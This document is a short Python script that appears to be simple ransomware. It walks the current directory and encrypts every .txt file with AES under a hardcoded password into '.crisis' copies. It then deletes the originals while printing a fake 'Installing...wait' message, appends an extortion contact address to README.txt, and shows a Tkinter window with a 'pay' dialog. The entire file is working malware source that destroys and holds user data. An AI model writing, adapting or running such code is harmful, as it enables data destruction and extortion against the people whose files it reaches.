from tkinter import *
from tkinter import Tk
from tkinter import messagebox
import pyAesCrypt
import os
from os import stat, remove
from shutil import *
from os import listdir
import os.path
#import hashlib
from sys import *



bufferSize = 64 * 1024
password = "foopassword"

path = '.'

files = []

for r, d, f in os.walk(path):
    for file in f:
        if '.txt' in file:
            files.append(os.path.join(r, file))

#dirName = 'C:/Yourfile'
#if not os.path.exists(dirName):
    #os.mkdir(dirName)
    #print("Directory " , dirName ,  " Created ")
print("Installing...wait")
for f in files:

    with open(f, "rb") as fIn:
        with open(f+".crisis", "wb") as fOut:
            pyAesCrypt.encryptStream(fIn, fOut, password, bufferSize)
            #copy(f+".crisis", dirName)

#path1 = 'C:/Users/yama-/Desktop/Yourfile'

#files1 = []
#for file in files:



dir_name = '.'
test = os.listdir(dir_name)
for item in test:
     if item.endswith(".txt"):
        os.remove(os.path.join(dir_name, item))

f = open("README.txt", "a")
f.write("For more information you can contact us in Crisis@exemple.exemple")
f.close()
print("Done")



root=Tk()
canvas1 = Canvas(root, width=1380, height=700)

canvas1.pack()

img = PhotoImage(file="2.ppm")
canvas1.create_image(20,20, anchor=NW, image=img)


def ExitApplication():
    MsgBox = messagebox.askquestion('pay', 'Are you sure you want to exit the application',
                                       icon='warning')
    if MsgBox == 'yes':
        root.destroy()
    else:
        messagebox.showinfo('Return', 'You will now return to the application screen')


button1 = Button(root, text='  EXIT  ', command=ExitApplication )
canvas1.create_window(650, 650, window=button1)

root.mainloop()

